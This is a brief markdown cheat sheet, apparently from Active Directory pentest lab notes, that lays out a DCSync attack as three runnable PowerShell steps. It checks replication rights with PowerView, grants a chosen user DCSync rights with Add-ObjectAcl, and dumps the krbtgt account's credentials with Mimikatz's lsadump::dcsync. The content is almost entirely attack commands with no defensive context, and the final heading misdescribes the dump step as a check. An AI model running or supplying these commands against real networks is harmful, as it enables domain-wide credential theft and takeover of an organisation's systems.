#### DCSync Attack

##### check for the replication rights
```powershell 
.\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "Username") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

##### no replication rights
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

##### check the replcation rights
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Microsoftcorp\krbtgt"'
```